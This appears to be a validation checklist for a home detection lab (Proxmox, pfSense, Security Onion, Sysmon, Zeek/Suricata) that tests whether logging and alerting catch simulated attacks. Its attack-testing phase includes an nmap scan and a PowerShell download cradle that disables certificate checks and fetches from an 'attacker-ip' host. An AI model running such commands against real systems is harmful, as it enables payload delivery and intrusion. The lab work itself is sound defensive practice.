# Lab Testing & Validation Checklist

## Phase 1: Infrastructure Testing

### Proxmox & Network
- [ ] Proxmox web UI accessible
- [ ] VM creation successful
- [ ] vmbr0 bridge working
- [ ] vmbr1 bridge working
- [ ] vmbr2 bridge working
- [ ] VMs can communicate within same bridge
- [ ] VMs cannot communicate across blocked bridges

**Testing Procedure:**
TODO: Execute
1. Create test VMs on each bridge
2. Ping within bridge (should work)
3. Ping across blocked bridges (should fail)
4. Document results

### pfSense Firewall
- [ ] pfSense web UI accessible
- [ ] All three networks connected
- [ ] Rules implemented correctly
- [ ] NAT working for outbound
- [ ] Logging enabled

**Testing Procedure:**
TODO: Execute
1. Ping from attacker to victim (should work if allowed)
2. Ping from victim to attacker (should fail if blocked)
3. Check firewall logs
4. Document rules in effect

---

## Phase 2: SIEM Testing

### Security Onion
- [ ] Web UI accessible
- [ ] All sensors running
- [ ] Elasticsearch healthy
- [ ] Indices being created

**Testing Procedure:**
TODO: Execute
1. SSH to Security Onion
2. Check sensor status: `sudo so-status`
3. Check Elasticsearch: `curl localhost:9200`
4. Verify indices created

### Data Ingestion
- [ ] Windows logs arriving
- [ ] Sysmon events indexed
- [ ] Network logs indexed
- [ ] Firewall logs indexed

**Testing Procedure:**
TODO: Execute
1. Verify WinLogBeat running on Windows
2. Check Kibana for indices
3. Search for logs from each source
4. Document ingestion delay

### Kibana
- [ ] Can login
- [ ] Can see indices
- [ ] Can run queries
- [ ] Dashboards visible

**Testing Procedure:**
TODO: Execute
1. Try basic search: `host:10.20.20.10`
2. Check for results
3. Try dashboard
4. Document any issues

---

## Phase 3: Logging Testing

### Windows Sysmon
- [ ] Sysmon running
- [ ] Events in Event Viewer
- [ ] Event IDs correct (1, 3, 7, 8, 11, 22)
- [ ] Logs in Kibana

**Testing Procedure:**
TODO: Execute
1. Start Notepad
2. Check Event Viewer for Event ID 1
3. Search Kibana for same process
4. Compare details

### Zeek/Suricata
- [ ] Sensors running
- [ ] Capturing traffic
- [ ] Generating logs
- [ ] Logs indexed

**Testing Procedure:**
TODO: Execute
1. Generate network traffic (ping, curl)
2. Check Zeek logs
3. Check Suricata logs
4. Verify in Kibana

---

## Phase 4: Attack & Detection Testing

### Simple Connectivity
- [ ] Kali can ping victim
- [ ] Kali can traceroute to victim
- [ ] Firewall logs these attempts

**Testing Procedure:**
TODO: Execute
```bash
ping 10.20.20.10
traceroute 10.20.20.10
```
TODO: Verify in SIEM

### Network Scan
- [ ] Kali can scan victim network
- [ ] Suricata detects scan
- [ ] Alert in Kibana

**Testing Procedure:**
TODO: Execute
```bash
nmap -sV 10.20.20.0/24
```
TODO: Check for alerts within 5 minutes

### Process Execution
- [ ] Execute process on Windows
- [ ] Sysmon logs it
- [ ] Visible in Kibana

**Testing Procedure:**
TODO: Execute
```bash
# On Windows
cmd.exe
whoami
```
TODO: Find in Kibana within 30 seconds

### Network Connection
- [ ] Process makes connection
- [ ] Sysmon Event ID 3 logged
- [ ] Zeek logs connection
- [ ] Both visible in Kibana

**Testing Procedure:**
TODO: Execute
```bash
# On Windows
powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
(New-Object System.Net.WebClient).DownloadString('http://attacker-ip:8000/test')
```
TODO: Check for logs from multiple sources

---

## Phase 5: End-to-End Testing

### Full Attack Scenario
- [ ] Execute multi-step attack
- [ ] All steps logged
- [ ] Complete timeline visible
- [ ] Can reconstruct attack

**Testing Procedure:**
TODO: Execute
1. Scan from Kali
2. Execute exploit
3. Create process
4. Make network connection
5. Access file
6. Check all logs
7. Build timeline in Kibana

### Investigation Capability
- [ ] Can search all logs
- [ ] Can correlate events
- [ ] Can create report
- [ ] Can prove what happened

**Testing Procedure:**
TODO: Execute
1. Given alert, find initial access
2. Trace attacker actions
3. Identify compromised files
4. Document findings
5. Create professional report

---

## Phase 6: Documentation Verification

### Setup Documentation
- [ ] Hardware specs documented
- [ ] Network diagram complete
- [ ] IP addressing scheme recorded
- [ ] Passwords/credentials stored securely
- [ ] Configurations exported

### Testing Results
- [ ] All tests documented
- [ ] Pass/fail recorded
- [ ] Issues identified
- [ ] Resolutions documented
- [ ] Screenshots included

### Usage Documentation
- [ ] How to run attack
- [ ] How to investigate
- [ ] How to interpret results
- [ ] Troubleshooting guide
- [ ] Contact info for support

---

## Issues Found & Resolution

### Issue Tracking Template
TODO: For each issue found:

```
Issue #1: [Description]
Severity: [High/Medium/Low]
Affected Component: [Component]
Steps to Reproduce: [Steps]
Expected Behavior: [Expected]
Actual Behavior: [Actual]
Root Cause: [Cause]
Resolution: [Fix applied]
Testing: [How verified fixed]
```

---

## Sign-Off Checklist

### All Infrastructure Working
- [ ] All VMs operational
- [ ] All networks connected
- [ ] All services running
- [ ] All logs flowing

### All Detection Working
- [ ] Attacks detected
- [ ] Alerts generated
- [ ] Logs indexed
- [ ] Can investigate

### All Documentation Complete
- [ ] Setup guide
- [ ] Configuration reference
- [ ] Troubleshooting guide
- [ ] Attack procedures
- [ ] Investigation procedures

### Lab Ready for Use
- [ ] Can run attack simulations
- [ ] Can perform investigations
- [ ] Can train others
- [ ] Ready for portfolio

---

## Success Criteria: Lab is Production-Ready
- ✅ All infrastructure tests pass
- ✅ All detection tests pass
- ✅ All documentation complete
- ✅ Can perform full attack → investigation
- ✅ No critical issues remaining
- ✅ Lab stable for extended use
